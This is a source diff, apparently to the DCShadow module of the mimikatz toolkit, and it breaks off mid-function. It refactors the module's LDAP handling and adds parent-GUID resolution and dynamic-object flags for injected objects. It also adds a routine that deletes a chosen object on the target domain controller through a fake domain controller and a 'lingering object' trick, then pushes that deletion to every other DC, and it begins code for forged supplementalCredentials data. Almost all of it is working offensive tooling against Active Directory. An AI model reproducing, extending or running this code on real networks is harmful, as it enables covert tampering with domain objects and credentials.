@@ -582,18 +582,24 @@ BOOL kuhl_m_lsadump_dcshadow_clean_push_request(PDCSHADOW_PUSH_REQUEST request)
 	return TRUE;
 }
 
-void kuhl_m_lsadump_dcshadow_clean_domain_info(PDCSHADOW_DOMAIN_INFO dif)
+void kuhl_m_lsadump_dcshadow_clean_domain_info(PDCSHADOW_DOMAIN_INFO info)
 {
-	if(dif->szDomainName)
-		LocalFree(dif->szDomainName);
-	if(dif->szDomainNamingContext)
-		LocalFree(dif->szDomainNamingContext);
-	if(dif->szConfigurationNamingContext)
-		LocalFree(dif->szConfigurationNamingContext);
-	if(dif->hGetNCChangeCalled)
-		CloseHandle(dif->hGetNCChangeCalled);
-	if(dif->request)
-		kuhl_m_lsadump_dcshadow_clean_push_request(dif->request);
+	if(info->szDomainName)
+		LocalFree(info->szDomainName);
+	if(info->szDomainNamingContext)
+		LocalFree(info->szDomainNamingContext);
+	if(info->szDCDsServiceName)
+		LocalFree(info->szDCDsServiceName);
+	if(info->szConfigurationNamingContext)
+		LocalFree(info->szConfigurationNamingContext);
+	if(info->szDsServiceName)
+		LocalFree(info->szDsServiceName);
+	if(info->hGetNCChangeCalled)
+		CloseHandle(info->hGetNCChangeCalled);
+	if(info->ld)
+		ldap_unbind(info->ld);
+	if(info->request)
+		kuhl_m_lsadump_dcshadow_clean_push_request(info->request);
 }
 
 static BOOL kuhl_m_lsadump_dcshadow_remove_object(PDCSHADOW_PUSH_REQUEST request, PCWSTR szObject)
@@ -843,6 +849,10 @@ NTSTATUS kuhl_m_lsadump_dcshadow_encode(PDCSHADOW_PUSH_REQUEST request, int argc
 									pAttribute->MetaData.dwFlag |= REPLICATION_TIME_SET;
 								else PRINT_ERROR(L"unable parse replOriginatingTime\n");
 							}
+							if(kull_m_string_args_byName(argc, argv, L"dynamic", NULL, NULL))
+							{
+								pObject->dwFlag |= OBJECT_DYNAMIC;
+							}
 						}
 						else PRINT_ERROR(L"unable to set value\n");
 					}
@@ -937,7 +947,7 @@ PSTR kuhl_m_lsadump_dcshadow_getSingleTextAttrA(PLDAP ld, PLDAPMessage pMessage,
 	return result;
 }
 
-BOOL kuhl_m_lsadump_dcshadow_objectGUID_invocationGUID(PLDAP ld, PDCSHADOW_DOMAIN_INFO dif, PWSTR szComputerDns, PDCSHADOW_DOMAIN_DC_INFO pInfo)
+BOOL kuhl_m_lsadump_dcshadow_objectGUID_invocationGUID(PDCSHADOW_DOMAIN_INFO info, PWSTR szComputerDns, PDCSHADOW_DOMAIN_DC_INFO pInfo)
 {
 	DWORD dwErr;
 	PWCHAR serverAttr[] = {L"objectGUID", L"invocationId", L"msDS-ReplicationEpoch", NULL}, sitesBase, sitesFilter, serverBase, szEpoch;
@@ -945,23 +955,23 @@ BOOL kuhl_m_lsadump_dcshadow_objectGUID_invocationGUID(PLDAP ld, PDCSHADOW_DOMAI
 	PBERVAL res;
 	
 	RtlZeroMemory(pInfo, sizeof(DCSHADOW_DOMAIN_DC_INFO));
-	if(kull_m_string_sprintf(&sitesBase, L"CN=Sites,%s", dif->szConfigurationNamingContext))
+	if(kull_m_string_sprintf(&sitesBase, L"CN=Sites,%s", info->szConfigurationNamingContext))
 	{
 		if(kull_m_string_sprintf(&sitesFilter, L"(&(objectClass=server)(dNSHostName=%s))", szComputerDns))
 		{
-			dwErr = ldap_search_sW(ld, sitesBase, LDAP_SCOPE_SUBTREE, sitesFilter, NULL, FALSE, &pSitesMessage);
+			dwErr = ldap_search_sW(info->ld, sitesBase, LDAP_SCOPE_SUBTREE, sitesFilter, NULL, FALSE, &pSitesMessage);
 			if(dwErr == LDAP_SUCCESS)
 			{
-				if(ldap_count_entries(ld, pSitesMessage) == 1)
+				if(ldap_count_entries(info->ld, pSitesMessage) == 1)
 				{
-					if(serverBase = ldap_get_dnW(ld, pSitesMessage))
+					if(serverBase = ldap_get_dnW(info->ld, pSitesMessage))
 					{
-						dwErr = ldap_search_sW(ld, serverBase, LDAP_SCOPE_ONELEVEL, L"(name=NTDS Settings)", serverAttr, FALSE, &pServerMessage);
+						dwErr = ldap_search_sW(info->ld, serverBase, LDAP_SCOPE_ONELEVEL, L"(name=NTDS Settings)", serverAttr, FALSE, &pServerMessage);
 						if(dwErr == LDAP_SUCCESS)
 						{
-							if(ldap_count_entries(ld, pServerMessage) == 1)
+							if(ldap_count_entries(info->ld, pServerMessage) == 1)
 							{
-								if(res = kuhl_m_lsadump_dcshadow_getSingleAttr(ld, pServerMessage, serverAttr[0]))
+								if(res = kuhl_m_lsadump_dcshadow_getSingleAttr(info->ld, pServerMessage, serverAttr[0]))
 								{
 									if(res->bv_len == sizeof(GUID))
 									{
@@ -974,7 +984,7 @@ BOOL kuhl_m_lsadump_dcshadow_objectGUID_invocationGUID(PLDAP ld, PDCSHADOW_DOMAI
 								}
 								else PRINT_ERROR(L"No %s attribute for %s server\n", serverAttr[0], szComputerDns);
 								
-								if(res = kuhl_m_lsadump_dcshadow_getSingleAttr(ld, pServerMessage, serverAttr[1]))
+								if(res = kuhl_m_lsadump_dcshadow_getSingleAttr(info->ld, pServerMessage, serverAttr[1]))
 								{
 									if(res->bv_len == sizeof(GUID))
 									{
@@ -987,9 +997,9 @@ BOOL kuhl_m_lsadump_dcshadow_objectGUID_invocationGUID(PLDAP ld, PDCSHADOW_DOMAI
 								}
 								else PRINT_ERROR(L"No %s attribute for %s server\n", serverAttr[1], szComputerDns);
 
-								if(szEpoch = kuhl_m_lsadump_dcshadow_getSingleTextAttr(ld, pServerMessage, serverAttr[2]))
+								if(szEpoch = kuhl_m_lsadump_dcshadow_getSingleTextAttr(info->ld, pServerMessage, serverAttr[2]))
 								{
-									dif->dwReplEpoch = wcstoul(szEpoch, NULL, 10);
+									info->dwReplEpoch = wcstoul(szEpoch, NULL, 10);
 									LocalFree(szEpoch);
 								}
 							}
@@ -1038,15 +1048,74 @@ BOOL kuhl_m_lsadump_dcshadow_build_convert_account_to_dn(PLDAP ld, PWSTR szDomai
 	return status;
 }
 
+BOOL kuhl_m_lsadump_dcshadow_build_parentGuid_from_dn(PLDAP ld, PWSTR szObjectDN, GUID* pParentGuid)
+{
+	BOOL fSuccess = FALSE;
+	PWSTR szParentDN;
+	DWORD dwErr, len, i;
+	WCHAR** szrdns;
+	PWCHAR replAttr[] = {L"objectGUID", NULL};
+	PBERVAL *guid;
+	PLDAPMessage pMessage = NULL;
+
+	if (wcsncmp(szObjectDN, L"DC=", 3) == 0)
+	{
+		RtlZeroMemory(pParentGuid, sizeof(GUID));
+		return TRUE;
+	}
+
+	if ((szrdns = ldap_explode_dn(szObjectDN, 0)) ==  NULL)
+	{
+		PRINT_ERROR(L"Unable to parse DN (%s)\n", szObjectDN);
+		return FALSE;
+	}
+	len = 1;
+	for(i = 1; szrdns[i] != NULL; i++)
+	{
+		len += (2 + lstrlenW(szrdns[i]));
+	}
+	szParentDN = (PWSTR) LocalAlloc(LPTR, len * sizeof(WCHAR));
+	if (szParentDN)
+	{
+		for(i = 1; szrdns[i] != NULL; i++)
+		{
+			if (i > 1)
+				wcscat_s(szParentDN, len, L",");
+			wcscat_s(szParentDN, len, szrdns[i]);
+		}
+	}
+	ldap_value_free(szrdns);
+	if (!szParentDN)
+		return FALSE;
+
+	dwErr = ldap_search_s(ld, szParentDN, LDAP_SCOPE_BASE, L"(objectclass=*)", replAttr, FALSE, &pMessage);
+	if(dwErr == LDAP_SUCCESS)
+	{
+		if((guid = ldap_get_values_len(ld, pMessage, replAttr[0])) != NULL && ((*guid)->bv_len == sizeof(GUID)))
+		{
+			RtlCopyMemory(pParentGuid, (*guid)->bv_val, (*guid)->bv_len);
+			fSuccess = TRUE;
+			ldap_value_free_len(guid);
+		}
+		ldap_msgfree(pMessage);
+	}
+	else
+	{
+		PRINT_ERROR(L"Parent DN (%s) not found\n", szParentDN);
+	}
+	LocalFree(szParentDN);
+	return fSuccess;
+}
+
 BOOL kuhl_m_lsadump_dcshadow_build_replication_version(PLDAP ld, PWSTR szDomainNamingContext, PDCSHADOW_PUSH_REQUEST_OBJECT object)
 {
 	BOOL status = FALSE; 
 
 	DWORD dwErr, i, j;
 	ATTRTYP attr;
-	PWCHAR replAttr[] = {L"replPropertyMetaData", L"objectSid", L"objectGUID", NULL};
+	PWCHAR replAttr[] = {L"replPropertyMetaData", L"objectSid", L"objectGUID", L"parentGUID", NULL};
 	PLDAPMessage pMessage = NULL;
-	PBERVAL res, *sid, *guid;
+	PBERVAL res, *sid, *guid, *parentguid;
 	PDS_REPL_OBJ_TYPE_META_DATA_BLOB blob;
 	// LDAP_SERVER_SHOW_DELETED_OID
 	LDAPControl deletedControl = {TEXT(szOID_ldapServer_show_deleted), 0};
@@ -1065,8 +1134,6 @@ BOOL kuhl_m_lsadump_dcshadow_build_replication_version(PLDAP ld, PWSTR szDomainN
 				{
 					for(i = 0; i < object->cbAttributes; i++)
 					{
-						// default version when creating new attribute
-						object->pAttributes[i].MetaData.curRevision = 1;
 						if(kull_m_rpc_drsr_MakeAttid((SCHEMA_PREFIX_TABLE *) &SCHEMA_DEFAULT_PREFIX_TABLE, object->pAttributes[i].pAttribute->Oid, &attr, FALSE))
 						{
 							for(j = 0; j < blob->ctr.cNumEntries; j++)
@@ -1074,6 +1141,8 @@ BOOL kuhl_m_lsadump_dcshadow_build_replication_version(PLDAP ld, PWSTR szDomainN
 								if(attr == blob->ctr.rgMetaData[j].attrType)
 								{
 									object->pAttributes[i].MetaData.curRevision = blob->ctr.rgMetaData[j].dwVersion;
+									// ftimeLastOriginatingChange is not a fileTime
+									*((PLONGLONG)&object->pAttributes[i].MetaData.curTimeChanged) = *((PLONGLONG) &blob->ctr.rgMetaData[j].ftimeLastOriginatingChange) * 10000000;
 									break;
 								}
 							}
@@ -1096,18 +1165,19 @@ BOOL kuhl_m_lsadump_dcshadow_build_replication_version(PLDAP ld, PWSTR szDomainN
 				RtlCopyMemory(&object->ObjectGUID, (*guid)->bv_val, (*guid)->bv_len);
 				ldap_value_free_len(guid);
 			}
+			if((parentguid = ldap_get_values_len(ld, pMessage, replAttr[3])) != NULL && ((*parentguid)->bv_len == sizeof(GUID)))
+			{
+				RtlCopyMemory(&object->ParentGuid, (*parentguid)->bv_val, (*parentguid)->bv_len);
+				ldap_value_free_len(parentguid);
+			}
 		}
 	}
 	else if(dwErr == LDAP_NO_SUCH_OBJECT)
 	{
 		status = TRUE;
 		kprintf(L"Object does not exist\n");
-		object->fAdd = TRUE;
-		for(i = 0; i < object->cbAttributes; i++)
-		{
-			// default version when creating new attribute
-			object->pAttributes[i].MetaData.curRevision = 1;
-		}
+		object->dwFlag |= OBJECT_TO_ADD;
+		kuhl_m_lsadump_dcshadow_build_parentGuid_from_dn(ld, object->szObjectDN, &object->ParentGuid);
 	}
 	else if(dwErr == LDAP_INVALID_DN_SYNTAX)
 	{
@@ -1134,42 +1204,41 @@ BOOL kuhl_m_lsadump_dcshadow_build_replication_version(PLDAP ld, PWSTR szDomainN
 }
 
 const PCWSTR SZ_DOMAIN_CONTROLLER_FUNCTIONALITY[] = {L"WIN2000", L"WIN2003 interim", L"WIN2003", L"WIN2008", L"WIN2008R2", L"WIN2012", L"WIN2012R2", L"WIN2016"};
-BOOL kuhl_m_lsadump_dcshadow_domaininfo_rootDse(PLDAP ld, PDCSHADOW_DOMAIN_INFO info)
+BOOL kuhl_m_lsadump_dcshadow_domaininfo_rootDse(PDCSHADOW_DOMAIN_INFO info)
 {
 	DWORD dwErr;
 	PWCHAR rootAttr[] = {L"rootDomainNamingContext", L"configurationNamingContext", L"schemaNamingContext", L"dsServiceName", L"domainControllerFunctionality", L"highestCommittedUSN", NULL};
 	PLDAPMessage pMessage = NULL;
 	PWCHAR tmp, p;
 	
-	dwErr = ldap_search_s(ld, NULL, LDAP_SCOPE_BASE, NULL, rootAttr, FALSE, &pMessage);
+	dwErr = ldap_search_s(info->ld, NULL, LDAP_SCOPE_BASE, NULL, rootAttr, FALSE, &pMessage);
 	if(dwErr == LDAP_SUCCESS)
 	{
-		if(ldap_count_entries(ld, pMessage) == 1)
+		if(ldap_count_entries(info->ld, pMessage) == 1)
 		{
-			if(info->szDomainNamingContext = kuhl_m_lsadump_dcshadow_getSingleTextAttr(ld, pMessage, rootAttr[0]))
+			if(info->szDomainNamingContext = kuhl_m_lsadump_dcshadow_getSingleTextAttr(info->ld, pMessage, rootAttr[0]))
 				kprintf(L"Domain:         %s\n", info->szDomainNamingContext);
-			if(info->szConfigurationNamingContext = kuhl_m_lsadump_dcshadow_getSingleTextAttr(ld, pMessage, rootAttr[1]))
+			if(info->szConfigurationNamingContext = kuhl_m_lsadump_dcshadow_getSingleTextAttr(info->ld, pMessage, rootAttr[1]))
 				kprintf(L"Configuration:  %s\n", info->szConfigurationNamingContext);
-			if(info->szSchemaNamingContext = kuhl_m_lsadump_dcshadow_getSingleTextAttr(ld, pMessage, rootAttr[2]))
+			if(info->szSchemaNamingContext = kuhl_m_lsadump_dcshadow_getSingleTextAttr(info->ld, pMessage, rootAttr[2]))
 				kprintf(L"Schema:         %s\n", info->szSchemaNamingContext);
-			if(tmp = kuhl_m_lsadump_dcshadow_getSingleTextAttr(ld, pMessage, rootAttr[3]))
+			if(info->szDCDsServiceName = kuhl_m_lsadump_dcshadow_getSingleTextAttr(info->ld, pMessage, rootAttr[3]))
 			{
-				p = wcsstr(tmp, L",CN=");
+				p = wcsstr(info->szDCDsServiceName, L",CN=");
 				if(p)
 				{
 					p = wcsstr(p + 1, L",CN=");
 					if(p && (p + 1) && kull_m_string_copy(&info->szDsServiceName, p));
 						kprintf(L"dsServiceName:  %s\n", info->szDsServiceName);
 				}
-				LocalFree(tmp);
 			}
-			if(tmp = kuhl_m_lsadump_dcshadow_getSingleTextAttr(ld, pMessage, rootAttr[4]))
+			if(tmp = kuhl_m_lsadump_dcshadow_getSingleTextAttr(info->ld, pMessage, rootAttr[4]))
 			{
 				info->dwDomainControllerFunctionality = wcstoul(tmp, NULL, 10);
 				LocalFree(tmp);
 			}
 			kprintf(L"domainControllerFunctionality: %u ( %s )\n", info->dwDomainControllerFunctionality, (info->dwDomainControllerFunctionality < ARRAYSIZE(SZ_DOMAIN_CONTROLLER_FUNCTIONALITY) ? SZ_DOMAIN_CONTROLLER_FUNCTIONALITY[info->dwDomainControllerFunctionality] : L"?"));
-			if(tmp = kuhl_m_lsadump_dcshadow_getSingleTextAttr(ld, pMessage, rootAttr[5]))
+			if(tmp = kuhl_m_lsadump_dcshadow_getSingleTextAttr(info->ld, pMessage, rootAttr[5]))
 			{
 				info->maxDCUsn = wcstoul(tmp, NULL, 10);
 				LocalFree(tmp);
@@ -1183,17 +1252,17 @@ BOOL kuhl_m_lsadump_dcshadow_domaininfo_rootDse(PLDAP ld, PDCSHADOW_DOMAIN_INFO 
 	return (dwErr == LDAP_SUCCESS) && info->szDomainNamingContext && info->szConfigurationNamingContext && info->szSchemaNamingContext && info->szDsServiceName;
 }
 
-BOOL kuhl_m_lsadump_dcshadow_domaininfo_schemasignature(PLDAP ld, PDCSHADOW_DOMAIN_INFO info)
+BOOL kuhl_m_lsadump_dcshadow_domaininfo_schemasignature(PDCSHADOW_DOMAIN_INFO info)
 {
 	DWORD dwErr;
 	PWSTR szAttributes[] = {TEXT("schemaInfo"), NULL};
 	PLDAPMessage pMessage = NULL;
 	struct berval** berSchemaInfo = NULL;
 	
-	dwErr = ldap_search_s(ld, info->szSchemaNamingContext, LDAP_SCOPE_BASE, NULL, szAttributes, FALSE, &pMessage);
+	dwErr = ldap_search_s(info->ld, info->szSchemaNamingContext, LDAP_SCOPE_BASE, NULL, szAttributes, FALSE, &pMessage);
 	if(dwErr == LDAP_SUCCESS)
 	{
-		berSchemaInfo = ldap_get_values_len(ld, pMessage,szAttributes[0]);
+		berSchemaInfo = ldap_get_values_len(info->ld, pMessage,szAttributes[0]);
 		if(!berSchemaInfo || (*berSchemaInfo)->bv_len != 21)
 		{
 			// default signature
@@ -1210,7 +1279,7 @@ BOOL kuhl_m_lsadump_dcshadow_domaininfo_schemasignature(PLDAP ld, PDCSHADOW_DOMA
 	return (dwErr == LDAP_SUCCESS);
 }
 
-BOOL kuhl_m_lsadump_dcshadow_domaininfo_computer(PDCSHADOW_DOMAIN_INFO info, PLDAP ld)
+BOOL kuhl_m_lsadump_dcshadow_domaininfo_computer(PDCSHADOW_DOMAIN_INFO info)
 {
 	DWORD dwErr;
 	PWSTR szComputerFilter, szTempComputerDN;
@@ -1220,12 +1289,12 @@ BOOL kuhl_m_lsadump_dcshadow_domaininfo_computer(PDCSHADOW_DOMAIN_INFO info, PLD
 	if(kull_m_string_sprintf(&szComputerFilter, L"(&(|(objectClass=user)(objectClass=computer))(sAMAccountName=%s$))", info->szFakeDCNetBIOS))
 	{
 		// search for computer info in LDAP
-		if(!(dwErr = ldap_search_s(ld, info->szDomainNamingContext, LDAP_SCOPE_SUBTREE, szComputerFilter, szComputerAttributes, FALSE, &pComputerSearchResult)))
+		if(!(dwErr = ldap_search_s(info->ld, info->szDomainNamingContext, LDAP_SCOPE_SUBTREE, szComputerFilter, szComputerAttributes, FALSE, &pComputerSearchResult)))
 		{
-			szTempComputerDN = ldap_get_dn(ld,pComputerSearchResult);
+			szTempComputerDN = ldap_get_dn(info->ld,pComputerSearchResult);
 			kull_m_string_copy(&info->szFakeDN, szTempComputerDN);
 			ldap_memfree(szTempComputerDN);
-			info->szFakeFQDN  = kuhl_m_lsadump_dcshadow_getSingleTextAttr(ld, pComputerSearchResult, L"dNSHostName");
+			info->szFakeFQDN  = kuhl_m_lsadump_dcshadow_getSingleTextAttr(info->ld, pComputerSearchResult, L"dNSHostName");
 			ldap_msgfree(pComputerSearchResult);
 		}
 		else PRINT_ERROR(L"computer not found in AD 0x%x (%u)\n", dwErr, dwErr);
@@ -1233,8 +1302,108 @@ BOOL kuhl_m_lsadump_dcshadow_domaininfo_computer(PDCSHADOW_DOMAIN_INFO info, PLD
 	return info->szFakeFQDN && info->szFakeDN;
 }
 
+ULONG kuhl_m_lsadump_dcshadow_init_ldap(PWSTR szFQDN, LDAP** pld)
+{
+	DWORD dwErr = 0;
+	LDAP* ld;
+	if(ld = ldap_init(szFQDN, 389))
+	{
+		ULONG version = LDAP_VERSION3;
+		// Set the version to 3.0 (default is 2.0).
+		ldap_set_option(ld,LDAP_OPT_PROTOCOL_VERSION,(void*) &version);
+		// enable LDAP signing - survive policies "network security: LDAP client signing requirements" + "domain controller: LDAP server signing requirements"
+		ldap_set_option(ld,LDAP_OPT_SIGN,LDAP_OPT_ON);
+		// ready to be enabled:
+		//ldap_set_option(ld,LDAP_OPT_ENCRYPT,LDAP_OPT_ON);
+
+		if(!(dwErr = ldap_connect(ld, NULL)))
+		{
+			if(!(dwErr = ldap_bind_s(ld, NULL, NULL, LDAP_AUTH_NEGOTIATE)))
+			{
+				*pld = ld;
+			}
+			else ldap_unbind(ld);
+		}
+		else ldap_unbind(ld);
+	}
+	return dwErr;
+}
+
+ULONG kuhl_m_lsadump_dcshadow_lingering_trigger(LDAP* ld, PWSTR szTargetNTDS, PWSTR szObject)
+{
+	DWORD dwErr;
+	PWSTR szMod[] = {NULL, NULL};
+	LDAPMod Modification = {LDAP_MOD_REPLACE , L"removeLingeringObject", szMod};
+	PLDAPMod pModification[] = {&Modification, NULL};
+
+	if(kull_m_string_sprintf(szMod, L"%s:%s", szTargetNTDS, szObject))
+	{
+		if (dwErr = ldap_modify_s(ld, L"", pModification))
+			PRINT_ERROR(L"removeLingeringObject 0x%x (%u)\n", dwErr, dwErr);
+		LocalFree(szMod[0]);
+	}
+	return dwErr;
+}
+
+// delete the object on the target DC by telling this is a lingering object and by leveraging the fake DC
+NTSTATUS kuhl_m_lsadump_dcshadow_lingering_initial(PDCSHADOW_DOMAIN_INFO info, PWSTR szObjectToKill)
+{
+	NTSTATUS status = STATUS_UNSUCCESSFUL;
+	PWSTR szTargetNTDS;
+	if(kull_m_string_sprintf(&szTargetNTDS, L"CN=NTDS Settings,CN=%s%s", info->szFakeDCNetBIOS, info->szDsServiceName))
+	{
+		status = kuhl_m_lsadump_dcshadow_lingering_trigger(info->ld, szTargetNTDS, szObjectToKill);
+		LocalFree(szTargetNTDS);
+	}
+	return status;
+}
+
+// use the target DC as reference (object is deleted) and tell others that their objects are lingering ones based on the target DC info
+NTSTATUS kuhl_m_lsadump_dcshadow_lingering_propagate(PDCSHADOW_DOMAIN_INFO info, PWSTR szObjectToKill)
+{
+	DWORD dwErr;
+	PLDAPMessage pMessage = NULL, pEntry, pServerMessage;
+	PWSTR szNTDSADn;
+	PWSTR szServerDN, szServerFQDN;
+	LDAP* ld;
+	PWSTR szAttributes[] = {L"dNSHostName", NULL};
+	dwErr = ldap_search_s(info->ld, info->szConfigurationNamingContext, LDAP_SCOPE_SUBTREE, L"(objectClass=nTDSDSA)", NULL, FALSE, &pMessage);
+	if(dwErr == LDAP_SUCCESS)
+	{
+		pEntry = pMessage;
+		while(pEntry != NULL)
+		{
+			szNTDSADn = ldap_get_dn(info->ld, pEntry);
+			szServerDN = wcsstr(szNTDSADn, L",CN=") + 1;
+			dwErr = ldap_search_s(info->ld, szServerDN, LDAP_SCOPE_BASE, NULL, szAttributes, FALSE, &pServerMessage);
+			if(dwErr == LDAP_SUCCESS)
+			{
+				szServerFQDN = kuhl_m_lsadump_dcshadow_getSingleTextAttr(info->ld, pServerMessage, szAttributes[0]);
+				if (szServerFQDN && _wcsicmp(szServerFQDN, info->szDCFQDN) != 0)
+				{
+					kprintf(L"  * %s\n", szServerFQDN);
+					if (!(dwErr = kuhl_m_lsadump_dcshadow_init_ldap(szServerFQDN, &ld)))
+					{
+						dwErr = kuhl_m_lsadump_dcshadow_lingering_trigger(ld, info->szDCDsServiceName, szObjectToKill);
+						if (dwErr)
+							PRINT_ERROR(L"trigger lingering for %s 0x%x (%u)\n", szServerFQDN, dwErr, dwErr);
+						ldap_unbind(ld);
+					}
+					else PRINT_ERROR(L"ldap_connect 0x%x (%u)\n", dwErr, dwErr);
+					LocalFree(szServerFQDN);
+				}
+				ldap_msgfree(pServerMessage);
+			}
+
+			pEntry = ldap_next_entry(info->ld, pEntry);
+		}
+		ldap_msgfree(pMessage);
+	}
+	return dwErr;
+}
+
 // ANSI version of ldap function used to match the fact that OID is a PSTR and not a PWSTR
-BOOL kuhl_m_lsadump_dcshadow_build_replication_attribute( LDAP* ld, PDCSHADOW_DOMAIN_INFO info, PDCSHADOW_OBJECT_ATTRIBUTE attribute)
+BOOL kuhl_m_lsadump_dcshadow_build_replication_attribute(PDCSHADOW_DOMAIN_INFO info, PDCSHADOW_OBJECT_ATTRIBUTE attribute)
 {
 	DWORD dwErr;
 	PWCHAR attributesFilter;
@@ -1245,15 +1414,15 @@ BOOL kuhl_m_lsadump_dcshadow_build_replication_attribute( LDAP* ld, PDCSHADOW_DO
 	attribute->dwSyntax = 0;
 	if(kull_m_string_sprintf(&attributesFilter, L"(&(objectclass=attributeSchema)(lDAPDisplayName=%s))", attribute->szAttributeName))
 	{
-		dwErr = ldap_search_sW(ld, info->szConfigurationNamingContext, LDAP_SCOPE_SUBTREE, attributesFilter, NULL, FALSE, &pAttributeMessage);
+		dwErr = ldap_search_sW(info->ld, info->szConfigurationNamingContext, LDAP_SCOPE_SUBTREE, attributesFilter, NULL, FALSE, &pAttributeMessage);
 		if(dwErr == LDAP_SUCCESS)
 		{
-			if(ldap_count_entries(ld, pAttributeMessage) == 1)
+			if(ldap_count_entries(info->ld, pAttributeMessage) == 1)
 			{
 				if(attribute->Oid)
 					LocalFree(attribute->Oid);
-				attribute->Oid =  kuhl_m_lsadump_dcshadow_getSingleTextAttrA(ld, pAttributeMessage, szAttributes[0]);
-				pszSyntaxOid = ldap_get_valuesA(ld, pAttributeMessage, szAttributes[1]);
+				attribute->Oid =  kuhl_m_lsadump_dcshadow_getSingleTextAttrA(info->ld, pAttributeMessage, szAttributes[0]);
+				pszSyntaxOid = ldap_get_valuesA(info->ld, pAttributeMessage, szAttributes[1]);
 				if(pszSyntaxOid)
 				{
 					if(kull_m_asn1_DotVal2Eoid(*pszSyntaxOid, &oid))
@@ -1265,7 +1434,7 @@ BOOL kuhl_m_lsadump_dcshadow_build_replication_attribute( LDAP* ld, PDCSHADOW_DO
 					}
 					ldap_value_freeA(pszSyntaxOid);
 				}
-				pszFlag = ldap_get_valuesA(ld, pAttributeMessage, szAttributes[2]);
+				pszFlag = ldap_get_valuesA(info->ld, pAttributeMessage, szAttributes[2]);
 				if(pszFlag)
 				{
 					DWORD systemFlag = strtoul(*pszFlag, NULL, 10);
@@ -1277,6 +1446,7 @@ BOOL kuhl_m_lsadump_dcshadow_build_replication_attribute( LDAP* ld, PDCSHADOW_DO
 				}
 			}
 			else PRINT_ERROR(L"attribute does not exist\n");
+			ldap_msgfree(pAttributeMessage);
 		}
 		else PRINT_ERROR(L"ldap_search_s 0x%x (%u)\n", dwErr, dwErr);
 		LocalFree(attributesFilter);
@@ -1419,6 +1589,7 @@ BOOL kuhl_m_lsadump_dcshadow_build_replication_value_dn(ATTRVAL* pVal, PWSTR szV
 // we assume that the OID to be encoded are declared in SCHEMA_DEFAULT_PREFIX_TABLE
 BOOL kuhl_m_lsadump_dcshadow_build_replication_value_oid(ATTRVAL* pVal, PWSTR szValue)
 {
+	BOOL fSuccess = FALSE;
 	PSTR szANSIValue = kull_m_string_unicode_to_ansi(szValue);
 	
 	if(szANSIValue)
@@ -1426,53 +1597,324 @@ BOOL kuhl_m_lsadump_dcshadow_build_replication_value_oid(ATTRVAL* pVal, PWSTR sz
 		pVal->valLen = sizeof(DWORD);
 		pVal->pVal = (PBYTE) MIDL_user_allocate(pVal->valLen);
 		if(pVal->pVal)
-			kull_m_rpc_drsr_MakeAttid((SCHEMA_PREFIX_TABLE*) &SCHEMA_DEFAULT_PREFIX_TABLE, szANSIValue, (ATTRTYP*) pVal->pVal, FALSE );
+			fSuccess = kull_m_rpc_drsr_MakeAttid((SCHEMA_PREFIX_TABLE*) &SCHEMA_DEFAULT_PREFIX_TABLE, szANSIValue, (ATTRTYP*) pVal->pVal, FALSE );
 		LocalFree(szANSIValue);
 	}
-	return pVal->pVal != NULL;
+	return fSuccess;
+}
+
+BOOL dataToHexWithoutNull(LPCVOID data, DWORD dwData, LPBYTE dest, DWORD dwDest)
+{
+	BOOL status = FALSE;
+	PCHAR buffer;
+	DWORD dwBuffer = dwData * 2 + 1, i;
+	if(dwDest >= (dwData * 2))
+	{
+		if(buffer = (PCHAR) LocalAlloc(LPTR, dwBuffer))
+		{
+			for(i = 0; i < dwData; i++)
+				if(sprintf_s(buffer + i * 2, dwBuffer - i * 2, "%02x", ((PBYTE) data)[i]) < 2)
+					break;
+			if(status = (i == dwData))
+				RtlCopyMemory(dest, buffer, dwBuffer - 1);
+			LocalFree(buffer);
+		}
+	}
+	return status;
+}
+
+BOOL kuhl_m_lsadump_dcshadow_build_replication_value_supplementalCredentials_UserProperties(PUSER_PROPERTIES *properties, DWORD *dwProperties, DWORD count, ...)
+{
+	BOOL status = FALSE;
+	va_list vaList;
+	
+	PCWSTR argType;
+	PVOID argData;
+	DWORD argDwData, argDwType, dwPackageString = 0, i;
+	PUSER_PROPERTY property;
+	PBYTE pStrings;
+
+	*dwProperties = FIELD_OFFSET(USER_PROPERTIES, UserProperties) + 1;
+	va_start(vaList, count);
+	for(i = 0; i < count; i++)
+	{
+		argType = va_arg(vaList, PCWSTR);
+		argData = va_arg(vaList, PVOID);
+		argDwData = va_arg(vaList, DWORD);
+		argDwType = lstrlen(argType);
+
+		dwPackageString += argDwType;
+		if(argType == wcsstr(argType, L"Primary:"))
+			dwPackageString -= 8;
+		*dwProperties += FIELD_OFFSET(USER_PROPERTY, PropertyName) + (argDwType * sizeof(wchar_t) + (argDwData * 2));
+	}
+	va_end(vaList);
+
+	dwPackageString += count - 1; // \0 between
+	dwPackageString *= sizeof(wchar_t);
+	*dwProperties += FIELD_OFFSET(USER_PROPERTY, PropertyName) + (16 + (dwPackageString * 2)); // L"Packages"
+
+	if(*properties = (PUSER_PROPERTIES) LocalAlloc(LPTR, *dwProperties))
+	{
+		(*properties)->Length = *dwProperties - 1 - FIELD_OFFSET(USER_PROPERTIES, Reserved4);
+		for(i = 0; i < sizeof((*properties)->Reserved4); i+= sizeof(wchar_t))
+			*(wchar_t *) ((*properties)->Reserved4 + i) = L' ';
+		(*properties)->PropertySignature = L'P';
+		(*properties)->PropertyCount = (USHORT) count + 1;
+
+		va_start(vaList, count);
+		for(i = 0, property = (*properties)->UserProperties; i < (*properties)->PropertyCount; i++, property = (PUSER_PROPERTY) ((PBYTE) property + FIELD_OFFSET(USER_PROPERTY, PropertyName) + property->NameLength + property->ValueLength))
+		{
+			if(!i)
+			{
+				property->NameLength = 16; // L"Packages"
+				property->ValueLength = (USHORT) dwPackageString * 2;
+				property->Reserved = 2; // ?
+				RtlCopyMemory(property->PropertyName, L"Packages", property->NameLength);
+				pStrings = (PBYTE) property + FIELD_OFFSET(USER_PROPERTY, PropertyName) + property->NameLength;
+				dwPackageString = property->ValueLength;
+			}
+			else
+			{
+				argType = va_arg(vaList, PCWSTR);
+				argData = va_arg(vaList, PVOID);
+				argDwData = va_arg(vaList, DWORD);
+
+				property->NameLength = (USHORT) lstrlen(argType) * sizeof(wchar_t);
+				property->ValueLength = (USHORT) argDwData * 2;
+				property->Reserved = 1; // ?
+				RtlCopyMemory(property->PropertyName, argType, property->NameLength);
+				if(!dataToHexWithoutNull(argData, argDwData, (PBYTE) property + FIELD_OFFSET(USER_PROPERTY, PropertyName) + property->NameLength, property->ValueLength))
+					break;
+
+				argDwType = (argType == wcsstr(argType, L"Primary:")) ? 8 : 0;
